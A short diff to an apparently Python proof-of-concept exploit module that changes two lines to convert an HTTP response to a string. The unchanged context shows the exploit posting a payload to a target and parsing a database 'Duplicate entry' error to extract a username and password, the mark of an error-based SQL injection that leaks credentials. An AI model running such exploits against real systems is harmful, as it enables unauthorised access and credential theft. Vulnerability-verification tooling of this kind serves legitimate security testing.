@@ -64,7 +64,7 @@ class Poc(ABPoc):
 
             req = urllib.request.Request(url=verify_url, data=postDataExp)
             response = urllib.request.urlopen(req, timeout=10)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r".*Duplicate\s*entry\s*'(?P<username>[\w]+)\|(?P<password>[\w]+)", re.I | re.S)
             match = pattern.match(content)
@@ -92,7 +92,7 @@ class Poc(ABPoc):
 
             req = urllib.request.Request(url=verify_url, data=postDataExp)
             response = urllib.request.urlopen(req, timeout=10)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r".*Duplicate\s*entry\s*'(?P<username>[\w]+)\|(?P<password>[\w]+)", re.I | re.S)
             match = pattern.match(content)
